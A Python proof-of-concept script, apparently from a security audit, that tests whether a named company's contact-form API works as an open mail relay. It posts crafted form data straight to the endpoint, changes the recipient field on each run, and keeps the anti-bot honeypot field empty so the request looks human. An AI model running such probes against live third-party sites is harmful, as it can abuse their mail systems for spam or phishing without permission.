#!/usr/bin/env python3
"""
Independent verification of the open-relay claim on POST /api/send.
Builds multipart FormData exactly like the site's own client code does
(FormData fields: fname,lname,areacode,tel,cname,subject,msg,check,targets)
and posts it straight to the API (bypassing the UI), varying ONLY the
`targets` recipient field between runs.
"""
import sys, json, uuid, time, urllib.request, urllib.error

HOST = "https://www." + "infinitycapital" + ".bh"
URL = HOST + "/api/send"

# Legit recipient as advertised by the site's own CMS settings payload
SITE = "info@" + "infinitycapital" + ".bh"


def build_fields(targets, tag, msg=None):
    return {
        "fname": "IV",
        "lname": "Verify",
        "areacode": "+973",
        "tel": "1710000" + str(int(time.time()) % 10),
        "cname": "IVAudit",
        "subject": "Investment Opportunities",
        "msg": msg or ("independent-verification probe " + tag),
        "check": "",            # honeypot: left empty, as a real human would
        "targets": targets,
    }


def post(targets, tag, msg=None):
    fields = build_fields(targets, tag, msg)
    b = "----IVB" + uuid.uuid4().hex
    parts = []
    for k, v in fields.items():
        parts.append(
            ('--%s\r\nContent-Disposition: form-data; name="%s"\r\n\r\n%s\r\n' % (b, k, v)).encode()
        )
    body = b"".join(parts) + ("--%s--\r\n" % b).encode()
    req = urllib.request.Request(
        URL, data=body, method="POST",
        headers={
            "Content-Type": "multipart/form-data; boundary=" + b,
            "Accept": "*/*",
            "User-Agent": "Mozilla/5.0 (IV-audit)",
        })
    t0 = time.time()
    try:
        r = urllib.request.urlopen(req, timeout=40)
        status, resp = r.status, r.read()
    except urllib.error.HTTPError as e:
        status, resp = e.code, e.read()
    except Exception as e:
        status, resp = 0, repr(e).encode()
    dt = time.time() - t0
    return {
        "tag": tag,
        "targets_sent": targets,
        "http_status": status,
        "elapsed_s": round(dt, 2),
        "resp_bytes": len(resp),
        "response": resp.decode("utf8", "replace")[:1500],
    }


if __name__ == "__main__":
    label = sys.argv[1]
    target = sys.argv[2]
    msg = sys.argv[3] if len(sys.argv) > 3 else None
    r = post(target, label, msg)
    print(json.dumps(r, indent=2))
    with open("/work/evidence/IVRELAY_INDEP/result_%s.json" % label, "w") as f:
        json.dump({"request_fields": build_fields(target, label, msg), "result": r}, f, indent=2)
